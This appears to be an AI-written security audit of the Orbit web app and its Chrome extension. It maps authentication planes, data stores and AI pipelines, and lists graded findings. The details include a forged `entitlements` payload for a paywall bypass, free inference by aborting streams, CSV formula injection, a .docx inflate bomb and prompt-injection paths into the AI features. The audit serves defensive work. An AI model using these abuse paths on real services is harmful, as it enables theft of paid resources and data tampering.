# Orbit security and resilience audit

**Date:** 2026-10-17 · **Base commit:** `eb5d69d` (branch `claude/trusting-wozniak-ebsks3`) · **Auditor:** Claude (Claude Code)
**Scope:** the full Next.js app under `src/`, the Chrome extension under `extension/`, CI and ops workflows, dependencies, and the data model. Everything was tested read-only against a throwaway PGlite database with fake accounts; no production, no real user data, no live third-party account was touched. Application code was **not** modified. The proofs live in `stress-tests/` (see §6).

This audit builds on the two from 2026-09-26 (`docs/security-audit-2026-09-26.md`, `docs/ai-security-audit-2026-09-26.md`). Every fix from those two was re-verified and still holds; those items are not repeated here except where a residual remains.

## Executive summary

The platform's security foundations are strong: tenancy is enforced server-side everywhere that was traced (about 400 server-action exports and 87 route handlers), every webhook verifies signatures, every internal job route fails closed, tokens are hashed or encrypted at rest, the SSRF guard holds against every bypass form tried, the chat surface is read-only by construction, and the secret scan of the tree and the fetched history found nothing live.

What this audit found is one layer down from tenancy: **business-rule and integrity gaps that a single ordinary account can exploit or stumble into**, plus a set of availability and cost-abuse paths. The most serious:

1. A paid-plan gate can be bypassed by passing a forged `entitlements` object through a server action's `options` argument (**H-01**).
2. An aborted managed-AI stream is settled at zero credits, so a scripted client can consume Orbit-paid inference for free (**H-02**).
3. One line in a subscribed calendar feed pins the shared sync worker's CPU indefinitely (**H-03**).
4. Two runners on one import job double every name-only contact and corrupt the counters; a capture save that fails half-way is reported as fully saved on resume (**H-04**, **H-05**).
5. Admin CSV exports are vulnerable to spreadsheet formula injection, and a crafted `.docx` in a connected OneDrive expands 1000× in memory inside the shared cron (**M-01**, **M-02**).

**No secrets need rotating.** No live credential was found in the working tree, in the 627 fetched commits, in `extension/.env.production` (public values only), or in docs and fixtures. The history scan is limited by the shallow clone (see §7).

Counts: **5 High, 18 Medium, 26 Low** security and integrity findings; **13 edge-case failures** demonstrated by the stress tests, of which 11 overlap with findings above.

**Update 2026-10-17:** Phase 1 of `FIX_PLAN.md` is implemented on this branch — H-01 through H-05, M-06 and M-17 are fixed, each pinned by a smoke test, and the corresponding `stress-tests/` proofs (AZ-OPT-1, REC-3, DI-IMPORT-DOUBLE, DI-CAPTURE-PARTIAL) now print `ok`. The findings below are kept as written so the evidence stays with the report.

---

## 1. Method

1. **Mapped the attack surface** (§2): every route handler read in full, every `"use server"` export scanned for its first auth call, validation, rate bucket and side effects; every table and non-DB store catalogued; every third-party integration and every place external content enters.
2. **Six parallel adversarial reviews**, each by a separate agent: auth/authz/tenancy; OAuth/integrations/webhooks/sync; injection/web/file handling; the AI pipeline; secrets/config/supply-chain/privacy/abuse; data integrity/concurrency/scale/UX. Each finding was then re-read at the cited lines by the lead; anything that could not be backed with a specific line was dropped.
3. **Stress tests** written and run on PGlite (`stress-tests/`): input extremes, SSRF guard edge cases, recurrence rules, concurrency races, a 20,000-contact account, and direct reproductions of the integrity findings. Results are quoted verbatim in §4 and §6.
4. **Tooling:** `npm audit` (full and `--omit=dev`), a secret-pattern scan of the tree and `git log -p` of the fetched history, `tsc --noEmit`, `eslint`, and the repository's own smoke harness.

**Environment limits that affect confidence:** the sandbox has no outbound DNS, so SSRF checks that depend on name resolution were verified by code reading rather than a live lookup; the database is PGlite, which serialises statements, so races were demonstrated by async interleaving of the same code paths (a race that shows on PGlite shows on Neon, whose HTTP driver has no interactive transactions at all); production environment variables (Vercel, Clerk, Stripe dashboards) were not observed, so anything marked *Dashboard* is a configuration to confirm, not a code defect.

---

## 2. Attack-surface map

### 2.1 Authentication planes

| Plane | Gate (file) | What it covers |
|---|---|---|
| Clerk session cookie | `src/proxy.ts` (`clerkMiddleware`; API paths get JSON 401, pages `auth.protect()`) then `requireUserId` / `requireAuthenticatedUser` in `src/lib/auth.ts` (also enforces suspension and the stealth hold). Demo mode (`NODE_ENV=development` and no Clerk keys) resolves every caller to `demo-user`. | All `(app)` pages; every export of the 66 `src/actions/*.ts` modules (~400 public POST endpoints); cookie-authenticated routes: `api/chat`, `api/capture/jobs`, `api/capture/meetings/[id]/*`, `api/speech/*`, `api/research`, `api/knowledge/refresh`, `api/export`, `api/presence`, `api/plan-upgrades/claim`, `api/avatars/[contactId]`, `api/capture/photos/*`, `api/imports/files/*`, `api/feedback/screenshots/*`, `api/contacts/avatar-backfill`, `api/meetings/candidates`, `api/email/attachments/upload`, the four OAuth callbacks |
| Plan / surface gates | `src/lib/plan-guards.ts` (`requireOutreachUser`, `requireRecruitersUser`, `requireSyncUser`, `requireMeetingsUser`, `requireUserForSurface`, `requireUserForReleasedSurface`), all built on `requireUserId` | Paid features and admin-toggled surfaces |
| Admin | `src/lib/admin.ts` (`requireAdminUserId` = session + `ADMIN_USER_IDS`; 404-shaped error; never `demo-user` off localhost) | 28 pages under `(clerk)/(admin)` (layout gate; two pages re-check), all 60 exports of `src/actions/admin*.ts`, the six `api/admin/*` routes |
| API key bearer (`orb_live_…`) | `src/lib/api/auth.ts` via `apiHandler` in `src/lib/api/http.ts` (shape regex before any query, SHA-256 lookup, revocation, scope, suspension, stealth, paywall) | `api/v1/{contacts,events,followups,followups/[id],interactions,me,notes,webhook-endpoints,webhook-endpoints/[id]}` |
| MCP (Clerk OAuth token, API key, or deprecated `mcpk_live_…` path token) | `src/lib/mcp/handle.ts` + `src/lib/mcp/oauth.ts` (refuses any `Origin`, batch ≤10, body ≤256 KB, per-call rate charge, scopes re-checked at execution) | `api/mcp`, `api/mcp/[token]`; discovery at `/.well-known/*` is public and carries no user data |
| Extension (Clerk session from `@clerk/chrome-extension`; dev secret only when `NODE_ENV=development`) | `src/lib/extension/auth.ts` via `extensionRoute` in `src/lib/extension/http.ts` (60 req/min, 10 AI/min, body cap, zod per route) | `api/extension/{contacts,event-roster,follow-ups,interactions,me,parse,resolve,signals,starters}` |
| `CRON_SECRET` internal | `src/lib/internal-auth.ts` (constant-time bearer; fail-closed on Vercel, open only for local `next dev`) | 24 job routes: `imports/process-stalled`, `imports/[id]/continue`, `capture/jobs/[id]/run`, `avatars/encode`, `embeddings/backfill`, `work-history/*`, `linkedin/timeline-events/backfill`, `relationships/run`, `ops/*`, `sync/run`, `jobs/feed/sweep`, `radar/*`, `cloud-notes/run`, `credits/notices`, `webhooks/outbound/drain`, `connectors/outbox/drain`, `email/drain` |
| Opaque or signed token, no session | `findUserByFeedToken` (SHA-256), `findScanHandoff` (shape regex, SHA-256, 10-min TTL), HMAC unsubscribe readers, share tokens | `api/calendar/[token]`, `/scan/[token]` + `api/scan/[token]/{pages,finish}`, `api/{credits/email,radar/digest,interest-list}/unsubscribe`, `api/interest-list/{progress,ticket-image}`, `api/waitlist-poll/results` |
| Provider-signed webhooks | Svix (`verifyWebhook`), Stripe (`constructEvent`), Resend (own Standard-Webhooks HMAC, ±5 min, timing-safe); each fails closed when its secret is unset | `api/webhooks/{clerk,stripe,resend}` |
| Genuinely public | IP throttles, BotID on the waitlist join | `/`, marketing pages, `/interest`, `api/track`, `api/csp-report`, `api/health` (deep view needs `HEALTH_TOKEN`), `robots.txt`, `sitemap.xml`, and the public server actions `joinInterestList`, `saveInterestListName`, `recordPassCheckAction`, `setPollStars`, `submitContactMessage` |

### 2.2 Route handlers (87)

Full per-route detail (auth plane, validation, bucket, tables read and written, side effects) was produced for every handler; the condensed view below groups by plane and lists what each handler reads, writes and calls out to. Rate buckets are `RATE_LIMITS.*` in `src/lib/rate-limit.ts` (a fixed window per `(scope,key)` kept in `rate_limit_buckets`).

**Cookie session (Clerk).** `api/chat` POST (SSE; `chat` 20/min; writes `chat_messages`, `chat_threads`, `usage_events`; AI calls; **no Origin check**), `api/capture/jobs` POST (multipart; Origin + custom header; `capture`/`captureParts`; writes `capture_jobs`, `capture_photos`, Blob; transcription + optional extraction), `api/capture/meetings/[id]/{chunks,segments,stream-token}` (Origin + recorder header; WAV magic bytes; `meetingChunk`/`speechToken`; Deepgram), `api/speech/{token,usage}` (Origin; `speechToken`; usage is client-reported), `api/research` (custom header; 4 KB body; `webResearch` 30/day; hosted web search), `api/knowledge/refresh` (Origin; uuid; `knowledgeRefresh`), `api/export` GET (`export` 5/h; streams every user-scoped table, secrets redacted), `api/presence`, `api/plan-upgrades/claim`, `api/email/attachments/upload` (Blob client token under the caller's prefix; `emailAttachmentUpload`; **no Origin check**), `api/avatars/[contactId]` GET (**mutates and fetches a stored URL on GET**; `avatarResolve`; **no uuid shape check → 500 on garbage**), `api/capture/photos/[photoId]`, `api/imports/files/[fileId]`, `api/feedback/screenshots/[shotId]` (owner-or-admin; **no uuid shape check**), `api/contacts/avatar-backfill`, `api/meetings/candidates`, and the OAuth callbacks `api/gmail/callback`, `api/outlook/callback`, `api/events/eventbrite/callback`, `api/openrouter/callback` (state cookie bound to the session user; `returnTo` through `safeReturnPath`; OpenRouter uses PKCE + AES-GCM-encrypted state).

**Admin.** `api/admin/{export,email-preview,presence,health/live,overview/live,ops/test-error}`. Export is CSV or JSON of the roster, imports, connections, usage, interest list, feedback and audit log (**formula injection, M-01**); `test-error` returns 500 rather than 404 to non-admins.

**API key.** `api/v1/contacts` GET/POST, `api/v1/events` POST (≤1 MB, `apiIngest`), `api/v1/followups` GET, `api/v1/followups/[id]` PATCH, `api/v1/interactions` GET, `api/v1/me`, `api/v1/notes` POST (creates an AI capture job on the key owner's provider), `api/v1/webhook-endpoints` GET/POST/DELETE (SSRF guard, ≤10 per account; **DELETE has no uuid check → 500**), `api/v1/openapi.json` (public spec).

**MCP.** `api/mcp` and `api/mcp/[token]`: 20+ read tools and the write tools `add_note`, `log_interaction`, `create_contact`, `update_contact`, `create_reminder`, `request_send` (which only stages a draft a human approves).

**Extension.** Nine routes, all zod-validated with a 60/min budget and 10 AI/min; `parse` and `starters` call the model on the user's key with scraped page text.

**`CRON_SECRET`.** The 24 job routes listed in §2.1. Several accept an arbitrary `userId` or job id (`embeddings/backfill`, `relationships/run`, `linkedin/timeline-events/backfill`, `work-history/research`, `imports/[id]/continue`, `capture/jobs/[id]/run`); the secret is therefore equivalent to "spend any user's AI key and run any job". `imports/process-stalled` is a **GET that mutates** (kicks jobs, prunes tables, deletes Blobs, purges orphaned Clerk users).

**Opaque token.** `api/calendar/[token]` (ICS feed of reminders), `api/scan/[token]/{pages,finish}` (phone photos transcribed on the **owner's** AI key; 12 per 5 min per owner; `files[]` element shape not validated), the three unsubscribe routes (GET confirm page, POST act; RFC 8058), `api/interest-list/{progress,ticket-image}`, `api/waitlist-poll/results`.

**Webhooks.** `api/webhooks/clerk` (user create/update/delete; delete runs the full purge), `api/webhooks/stripe` (plan mirror, credits, dedupe table), `api/webhooks/resend` (bounce suppression by email on the interest list).

**Public.** `api/track` (cookieless page views; in-memory per-IP throttle per instance), `api/csp-report` (8 KB cap, origin only, 100 rows/h/instance), `api/health`, `/.well-known/*` (CORS `*`, public metadata).

### 2.3 Server actions (66 files, ~400 exports)

Every export derives its user from the session (`requireUserId` and the gates built on it) or is a harmless cookie-only helper; a parser-based scan written for this audit confirmed it beyond what `scripts/smoke-action-user-scope.ts` checks (that test only flags exports that *take* a user-id-shaped parameter). Three OAuth-state consumers (`consumeGmailOAuthState`, `consumeOutlookOAuthState`, `consumeEventbriteOAuthState`) are exported from `"use server"` modules and are therefore callable by anyone, but they only read and delete the caller's own cookie.

What is weak across the board: **60 of 66 action modules use no runtime schema** (TypeScript types only), so a non-string `title` is a `TypeError` → 500 and a garbage date is `Invalid Date` → `RangeError` (M-04). Every traced `.set(patch)` builds its patch from an explicit allowlist, so no mass assignment was found. Client-supplied **`options` objects are passed straight through** to the write layer in `createContact`, `createContactDetailed`, `createContactsBulk` and `updateContact` (H-01).

AI-spending actions with **no rate bucket**: `outreach.ts` (`generateOutreachDrafts`, `regenerateOutreachDraft`, `generateDueFollowUps`), `recruiter-messages.ts` (`generateRecruiterDrafts`), `email-compose.ts`, `calendar-prep.ts`, `agent-sends.ts`, `opportunities.ts` and `contact-profile.ts` (brief regeneration in `after()`), `duplicates.ts` (LLM decisions). Managed-key spend on these is bounded only by the credit ledger (M-07).

### 2.4 Pages

Auth lives in `(clerk)/(app)/layout.tsx` (session, suspension, stealth hold, onboarding gate) and `(main)/layout.tsx` (`requireUserId` + surface visibility); `(admin)/layout.tsx` calls `requireAdminPage()` (26 of 28 admin pages rely on it alone, which is fine for pages since layouts run on every page render; the known caveat, that layouts do not run for action POSTs, is covered because every admin action calls `requireAdminUserId` itself). Every `[id]` page (`contacts/[id]`, `events/[id]`, `meetings/[id]`, `outreach/[id]`, `recruiters/[id]`, `capture/[batchId]`, `admin/users/[userId]…`, `scan/[token]`) loads through a user-scoped (or token-scoped) reader and `notFound()`s on a miss.

### 2.5 Data stores and sensitive data

119 `pgTable`s (121 `CREATE TABLE`s in the DDL). The ones that matter for this audit:

| Data | Store | At rest | Deleted on account deletion |
|---|---|---|---|
| BYOK AI / Apollo / Resend / Twilio / TypeSafe keys | `user_settings.*_encrypted` | AES-256-GCM (`src/lib/crypto.ts`) | Yes |
| Google / Microsoft / Apple / Eventbrite / Luma / connector tokens | `gmail_connections`, `outlook_connections`, `apple_connections`, `event_provider_connections`, `connector_connections` (`*_encrypted`) | AES-256-GCM | Yes; Google grant also revoked at the provider |
| API keys, calendar-feed token, scan tokens, inbound-log token, radar unsubscribe token | `api_keys.key_hash`, `user_settings.calendar_feed_token`, `capture_handoffs.token_hash`, … | SHA-256 | Yes |
| Interest-list `unsubscribe_token`, `share_token` | `interest_list_signups` | **plaintext** | Not tied to account deletion (waitlist identity is the email) |
| Webhook endpoint secrets | `webhook_endpoints.secret_encrypted` | AES-256-GCM; shown once; **no rotate** | Yes |
| Contact PII, notes, interactions, transcripts, chat, email bodies sent | `contacts`, `interactions`, `note_batches`, `meeting_transcript_segments`, `chat_messages`, `email_sends.body_*` | plain | Yes (73 explicit deletes plus cascades, verified by `smoke-purge`) ; **no TTL otherwise** |
| Capture photos, feedback screenshots, avatars, event covers | Vercel Blob `access:"public"` with random suffix (photos and screenshots are proxied by owner-checked routes and the URL never reaches the browser; avatars and covers are redirected to) | — | Photos/screenshots/avatars deleted with their rows; **event covers never deleted** |
| Email attachments | Blob under `email-attachments/{userId}/` via a one-file client token; `attachment-paths.ts` declares `private` (*verify the effective access mode in the Blob dashboard*) | — | Swept |
| Visitor analytics | `page_views.visitor_hash` = SHA-256(daily salt + IP + UA); no raw IP or UA stored | hash | `user_id` nulled; 180-day TTL |
| Rate-limit keys | `rate_limit_buckets` (public routes keyed by a salted IP hash) | hash | 2-day prune |
| Cross-user ("shared") tables | `recruiters` (PII gated by `user_recruiter_links` and an opt-in), `linkedin_avatars`, `org_brand_colors`, `job_postings`, `external_items`, `rate_limit_buckets`, `error_events`, `cron_runs`, `webhook_deliveries` (keeps Resend recipient emails; **never pruned**) | — | Re-attributed or kept |
| Billing | `user_settings.stripe_customer_id`, `billing_events`, `credit_grants` | plain | **Stripe customer kept**; `billing_events` anonymised; `credit_grants` keep `user_id` |
| Telemetry | Sentry (`sendDefaultPii:false`, 10 % traces, `beforeSend` scrub in `src/lib/sentry-scrub.ts`), Vercel Analytics (URLs redacted), Slack ops alerts | — | Outside the purge |

Cookies the app sets: `orbit_attr` (httpOnly, Lax, secure in prod), four OAuth-state cookies (httpOnly, Lax, ≤10 min, deleted on first callback), `wp_voter`, `orbit_view_as_user` and `orbit_preview_unreleased` (admin-only, httpOnly), `orbit-tz` (client, validated as an IANA zone before SQL), `orbit_people_nav`. Clerk manages `__session` and friends (SameSite=Lax by Clerk's default; not verifiable from the repo).

### 2.6 Third-party integrations

| Provider | Purpose | Scopes | Token storage | Disconnect / revoke | Inbound verification |
|---|---|---|---|---|---|
| Google | Gmail scan + send, Contacts, Calendar, Drive picker/import, cloud notes | `openid email` + per purpose `contacts.readonly`, `gmail.readonly`, `gmail.send`, `calendar.readonly`, `drive.file`, `drive.readonly`; `access_type=offline`, `include_granted_scopes` | `gmail_connections` encrypted | Row, calendar sources, cloud-note source and event-mail opt-in deleted; grant revoked at Google (5 s cap) | — |
| Microsoft Graph | Outlook mail scan + send, Contacts, Calendar, OneDrive notes | `openid profile email offline_access User.Read` + `Contacts.Read`, `Calendars.Read`, `Mail.Read`, `Mail.Send`, `Files.Read` | `outlook_connections` encrypted | Row and sources deleted; **no provider revoke exists** (user directed to the Microsoft account page) | — |
| Apple iCloud (CalDAV) | Calendar | app-specific password | `apple_connections` encrypted | Row + sources deleted | — |
| Eventbrite / Luma / ICS subscriptions | Events, rosters, calendars | default / API key / secret URL | `event_provider_connections` encrypted; `calendar_subscriptions.ics_url` plaintext (redacted from export) | Row deleted; no provider revoke | — |
| OpenRouter | BYOK via PKCE | `key_label=Orbit` | `user_settings` encrypted | clear | — |
| Stripe | Billing | — | customer id | portal | signature (SDK) + `stripe_processed_events` |
| Clerk | Identity; OAuth AS for MCP | `orbit:read`/`orbit:write` (MCP) | — | — | Svix |
| Resend | Transactional, waitlist, broadcasts, hosted/BYO outreach | — | env + `user_settings` encrypted | clear | Standard-Webhooks HMAC |
| Twilio | SMS outreach | — | `user_settings` encrypted / hosted env creds for entitled plans | clear | none needed (no status callbacks) |
| Deepgram | Speech-to-text | — | env; browser gets 30 s grant tokens | — | — |
| Apollo, Microlink, Unavatar, Gravatar, LinkedIn CDN | Prospects, photos | — | env / encrypted BYO | — | — |
| Vercel Blob, BotID, Analytics, Sentry, Slack, Neon | Storage, bot check, telemetry, alerts, DB | — | env | — | — |
| Customer webhook endpoints, Zapier/Make, HubSpot (dormant) | Outbound events / write-back | event types | `webhook_endpoints` encrypted | DELETE cascades | `Orbit-Signature: t=,v1=` HMAC-SHA256 |

### 2.7 Where user or external content enters

Forms and actions (`src/actions/*` → `contact-writes.ts`, `reminder-writes.ts`, …); capture uploads (`api/capture/jobs`, phone scan, meeting audio, dictation via Deepgram); email attachments (Blob client upload); feedback screenshots (magic bytes checked); LinkedIn export ZIP/CSV, vCard, Google/Outlook CSV, calendar `.ics`, WhatsApp/iMessage exports (`import-adapters/*`, `linkedin-export-store.ts`); pasted LinkedIn text; synced mailboxes (Gmail/Outlook recruiter scan, email activity); synced calendars (Google, Graph, CalDAV, ICS feeds, Luma); Google/Outlook address books; cloud documents (Drive/OneDrive `.docx`, `.vtt`, text); the extension's scraped LinkedIn/Luma/Partiful DOM; the public API and MCP tools; inbound webhooks; user-supplied URLs (webhook endpoints, event pages, ICS feeds, contact websites, photo URLs); public RSS/job/social feeds; the contact form, waitlist join, poll, CSP reports and the analytics beacon.

### 2.8 Where content reaches a model

| Pipeline | Trigger | Untrusted inputs | Fenced | Output validated | Unattended write/send/fetch? | Cost control |
|---|---|---|---|---|---|---|
| Chat answer + research tool loop | user | notes, interactions, shared recruiter rows, rosters, calendar titles, prior answers, tool results | yes (per-call nonce) | prose guarded; proposals allowlisted + zod | no (proposals need a click; sends need a click) | 20/min; hold per call; 3 rounds / 6 calls / 25 s |
| Chat understand / rerank / title / refine | user | prior answers, note snippets | **no** (understand/rerank) | sanitised | steers retrieval only | fast tier; race timeouts keep billing |
| Web research (`/find`, chat tool) | user | search results, typed homepage | yes | per-field clean | shown; saved on click | 30/day |
| Work-history research | user + **cron** | web search | yes | `cleanSingleLine` | **yes: company/title updated unattended** (web-grounded) | 60/day + 20/day background |
| Capture parse / dates / transcribe | user, cloud-notes cron, ICS/email | notes, OCR, transcripts, ICS attendees, email headers | notes yes; **structured hints no** | zod + verbatim excerpts | no (review deck) | 30/min; 100k chars |
| Contact brief | save hooks | one contact's records | yes | zod; no output guard | stored summary → chat (fenced there) | gate decision |
| Relationship engine | **cron** | LinkedIn DMs, email bodies | yes | zod + verbatim excerpt | **yes: reminders, company/title, summaries** (excerpt-grounded) | batch; background floor |
| Radar | **cron** + user | contact facts, news | yes | zod + guard | autopilot sets follow-up reminders; email HTML-escaped | 5 drafts/run |
| Recruiter scan | user batch | email bodies | yes | zod + confidence floor + `cleanRecruiterFields` | **yes: shared recruiter row written** (cleaned) | batch |
| Recruiter / outreach drafts | user | history, prospect notes, prior AI draft | **partial** | **no output guard** | bulk send after link warning (skippable) | emailSend 10/10 min; **no draft bucket** |
| Follow-up drafts | user, radar | profile, history | yes | guard | no | cached 7 d |
| Meeting digest / talking points | user | transcript, invite | yes; **reduce partials no** | zod + excerpt-grounded | stored; action items → reminders on save | chunk limits |
| LinkedIn timeline | import, cron | DM threads | yes | zod | **yes: interactions inserted** | daily cap |
| Extension parse / starters | user | scraped page ≤200 KB | yes (neutralised) | zod | returned; user saves | 10/min; **untruncated** |
| Events "why" | user | shared roster rows | **no** | typed | stored `ai_note` **unguarded** | 30/h |
| MCP / API writes | agent | agent-written text | writes sanitised; reads fenced | zod | own CRM only; `request_send` → approval card with recipient trust | 120/min, 30 writes/min |

---

## 3. Findings

Severity is impact if exploited; likelihood is how easy it is for the relevant actor (an ordinary signed-in account unless stated). "Confirmed" means demonstrated by a stress test or by reading the exact lines quoted; "Code" means confirmed by reading only.

### 3.1 Findings table

| ID | Title | Category | Sev | Likelihood | Evidence |
|---|---|---|---|---|---|
| H-01 | Paywall and write-option bypass through a server action's `options` argument | Authorization / business logic | High | High | Confirmed (`stress-tests/input-extremes.ts` AZ-OPT-1) |
| H-02 | Aborted managed-AI streams are settled at zero credits | AI cost abuse | High | High | Code |
| H-03 | One `RRULE` line in a subscribed ICS feed hangs the shared sync worker | Availability / DoS | High | High | Confirmed (`recurrence-edge.ts` REC-3) |
| H-04 | Import engine has no job lease; two runners double every name-only contact and corrupt counters | Data integrity | High | Medium | Confirmed (`resilience-repros.ts` DI-IMPORT-DOUBLE) |
| H-05 | A capture save that fails half-way is reported as "saved" on resume; unsaved people are silently lost | Data integrity | High | Medium | Confirmed (DI-CAPTURE-PARTIAL) |
| M-01 | CSV formula injection in the admin export | Injection | Medium | Medium | Confirmed (INJ-CSV) |
| M-02 | OneDrive `.docx` inflate bomb expands fully in memory inside the cloud-notes cron | DoS / file handling | Medium | Medium | Confirmed (INJ-DOCX-BOMB: 120 KB → +358 MB heap) |
| M-03 | Outbound webhook drain has no claim and no per-user fairness | Integrity / availability | Medium | Medium | Confirmed (both overlapping drains selected the same row) + code |
| M-04 | Client-supplied dates reach `new Date()` unchecked → `RangeError` 500s | Input validation | Medium | High | Confirmed (EC-DATE-1/2) |
| M-05 | Free text has no length cap and no NUL stripping; multi-MB notes and `\u0000` break writes with opaque 500s | Input validation / DoS | Medium | High | Confirmed (EC-LEN-1/2/3, EC-NUL-1/2/3) |
| M-06 | Preview deployments can run migrations and backfills against production when `PRODUCTION_DB_HOST` is unset; previews may share production Clerk and Stripe | Config | Medium | Dashboard | Code (`src/lib/env.ts:300-326`) |
| M-07 | Six AI-spending server actions have no rate bucket | Abuse resistance | Medium | Medium | Code |
| M-08 | No retention for several PII-bearing tables (`webhook_deliveries` recipient emails, `email_sends` bodies, transcripts, feedback screenshots, `cron_runs`) | Privacy / retention | Medium | — | Code |
| M-09 | Account deletion leaves residue: Stripe customer kept, `credit_grants`/`billing_events` keep `user_id`, waitlist email untouched, Sentry outside the purge | Privacy / GDPR | Medium | — | Code |
| M-10 | A chat proposal can change a contact's `email`; later one-click sends go to the new address with no further recipient check | AI / prompt injection | Medium | Low | Code |
| M-11 | Outreach and recruiter drafts skip `guardModelOutput`; prior drafts and recruiter fields enter the prompt unfenced | AI | Medium | Medium | Code |
| M-12 | Closeness-sorted contacts list truncates at the first page when any contact has NULL closeness (every bulk import until the hourly rescore) | Data visibility | Medium | High | Confirmed (DI-PAGE-NULL: 50/120 reachable) |
| M-13 | Concurrent creates duplicate contacts; the free-plan contact cap is check-then-act; `keyFacts`/tags merge is read-modify-write | Concurrency | Medium | Medium | Confirmed (DI-DUP-CREATE, RACE-CAP-1: 529 rows past a 500 cap) |
| M-14 | Missing timeouts: Drive export fetch, OpenRouter key exchange, Blob proxy routes; webhook error bodies read in full | Resilience | Medium | Medium | Code |
| M-15 | Truncated model JSON is silently "repaired"; no `finish_reason=length` check, so long captures lose their tail and report success | AI resilience | Medium | Medium | Code (`src/lib/ai.ts:494-516`) |
| M-16 | Remaining unfenced prompt inputs: capture structured hints, event-roster "why", digest reduce partials, retrieval prompts, recruiter draft block | AI / prompt injection | Medium | Low | Code |
| M-17 | MCP OAuth tokens with no `orbit:*` scope still receive read+write (`MCP_OAUTH_REQUIRE_SCOPES` unset) | Authorization | Medium | Dashboard | Code (`src/lib/mcp/oauth.ts:58-70`) |
| M-18 | Speech minutes are client-reported; a client that never beacons gets ~6 h/day of unmetered Deepgram streaming until the nightly reconciliation | Cost abuse | Medium | Low | Code |
| L-01 | `/api/chat`, `/api/email/attachments/upload`, `/api/plan-upgrades/claim`, `/api/presence` have no Origin check (rely on Clerk's SameSite=Lax) | CSRF | Low | Low | Code |
| L-02 | URL fields stored without a scheme check: contact `website` (strict path), shared recruiter `linkedinUrl` raw fallback, event `url` raw fallback; rendered as `href` (React 19 neutralises `javascript:`) | XSS primitive | Low | Low | Confirmed (EC-URL-1) + code |
| L-03 | Bidi-override and zero-width characters survive manual contact fields (only agent/API writes are sanitised) | Spoofing / injection hiding | Low | Medium | Confirmed (EC-UNI-1) |
| L-04 | `%`/`_` unescaped in LIKE patterns: knowledge base, contact-search prefix, shared recruiter search | Input handling | Low | High | Confirmed (SCALE-LIKE, SCALE-LIKE-KB) |
| L-05 | Credit-email unsubscribe token is permanent and unrevocable; interest-list tokens stored in plaintext; interest-list unsubscribe has no rate limit | Tokens | Low | Low | Code |
| L-06 | `ENCRYPTION_SECRET` cannot be rotated (no key id, fixed salt); it doubles as the rate-limit IP salt and the log tag; non-prod fallbacks are hard-coded | Secrets | Low | — | Code |
| L-07 | Clerk `user.updated` is applied without dedupe; a replayed older event reverts email/name | Webhooks | Low | Low | Code |
| L-08 | Event covers live at deterministic public Blob URLs and are never deleted; capture photos and screenshots are public-but-unguessable Blobs | Storage | Low | Low | Code |
| L-09 | CSP ships report-only with `'unsafe-inline'` script-src and `img-src https:` | Headers | Low | — | Code |
| L-10 | DNS-rebinding window between `assertDeliverable` and `fetch` (acknowledged in code) | SSRF residual | Low | Low | Code |
| L-11 | Malformed ids reach uuid casts → 500: `api/avatars/[contactId]`, `api/feedback/screenshots/[shotId]`, `api/v1/webhook-endpoints/[id]`; scan `files[]` element shape; list cursors unvalidated | Robustness | Low | High | Code |
| L-12 | Waitlist join reveals whether an email is already on the list (`returning: true`) | Enumeration | Low | Medium | Code |
| L-13 | Public ops workflow prints the health JSON (sha, deployment id, schema versions); CI comments reference a `backup.yml` that was removed | Ops hygiene | Low | — | Code |
| L-14 | `error_events` / `reportError` can carry raw provider or model text (parse failures include a 200-char model excerpt) | Logging | Low | Low | Code |
| L-15 | Extension page text (≤200 KB) goes to the model untruncated; MCP body cap trusts `Content-Length`; one credit hold covers three research rounds; `withTimeout` races keep the provider request billing | AI cost / robustness | Low | Low | Code |
| L-16 | Admin sign-in links last 7 days; calendar-feed and scan tokens skip the stealth hold | Auth hygiene | Low | Low | Code |
| L-17 | Server-rendered dates use the server's zone (`toLocaleString` without `timeZone`) on meetings, recruiters, network stats, how-met | Locale | Low | High | Code |
| L-18 | Dependencies: 0 critical; 22 high / 16 moderate advisories, all in dev tooling or the `@clerk/ui → @solana/*` subtree not imported by server code; `pdfjs-dist` used without `isEvalSupported:false` | Supply chain | Low | — | `npm audit` |
| L-19 | Webhook endpoint secrets cannot be rotated; no provider-side revoke for Microsoft/Eventbrite/Luma | Integrations | Low | — | Code |
| L-20 | Import revert is check-then-act; referral tier uses exact equality; one bad model date discards a whole retrieval plan | Concurrency / robustness | Low | Low | Code |
| L-21 | `/api/track` throttle is per instance; API-key errors distinguish "unknown" from "revoked" | Abuse / info | Low | Low | Code |
| L-22 | No per-user caps on API keys, chat threads, reminders, notes, interactions or imports | Cost | Low | — | Code |
| L-23 | No audit rows for API-key create/revoke, self-deletion, data export, OAuth connect/disconnect, plan changes | Audit logging | Low | — | Code |
| L-24 | `scan/[token]` and bench routes have no route-group `error.tsx`; six routes lack `loading.tsx` | UX | Low | — | Code |
| L-25 | A client disconnect mid-stream deletes the typed question and the partial answer (credits already spent) | UX / cost | Low | High | Code |
| L-26 | A credit hold outlives a killed call for up to 10 minutes; `releaseHold` deletes every hold for the operation | Credits | Low | Low | Code |

### 3.2 Finding details

**H-01 — Paywall and write-option bypass through `options`.** `createContact(input, options)`, `createContactDetailed`, `createContactsBulk` and `updateContact` in `src/actions/contacts.ts:685-749` forward their second argument unchanged to `createContactForUser` / `updateContactForUser`. `ContactWriteOptions` (`src/lib/contact-writes.ts:58-98`) includes `entitlements`, `headroom`, `skipEmbedding`, `skipRevalidate`, `skipSummary`, `skipCloseness` and `mergeFactLists`, all intended for trusted server callers. `createContactForUser` uses `options?.entitlements ?? (await getEntitlements(userId))` (`:451`) for the free-plan cap. *Impact:* a Free account POSTs the action with `[input, { entitlements: { plan: "max", contactLimit: null } }]` and adds unlimited contacts; it can also skip embeddings and closeness scoring for its rows and flip merge semantics. *Proof:* `stress-tests/input-extremes.ts` AZ-OPT-1 — "forged entitlements object was used for the headroom check". The same pattern should be checked wherever an action takes an `options`-shaped parameter.

**H-02 — Aborted managed-AI streams settle at zero.** Streaming reports token usage only in the final chunk (`src/lib/ai.ts:2278-2327`). An abort throws before `report()`, so `withUsage` records the failure with empty tokens (`src/lib/usage-events.ts:195-203`); `usageRow` computes `estimateCostMicros` with no tokens, which returns `null` (`src/lib/ai-pricing.ts:173-178`); `settleManagedUsage` then charges `success === 1 ? … : 0` → **0** while deleting the hold (`src/lib/credits/ledger.ts:479-481`). Every plan has `hostedAi: true`. *Impact:* a scripted client reads the whole answer from the SSE stream and aborts before `done`; the provider bills Orbit for the full prompt and output and the account pays nothing. Bounded only by the chat bucket (20/min ≈ 28k answers/day). Research tool calls that hit the 20 s timeout are the same shape with per-search billing.

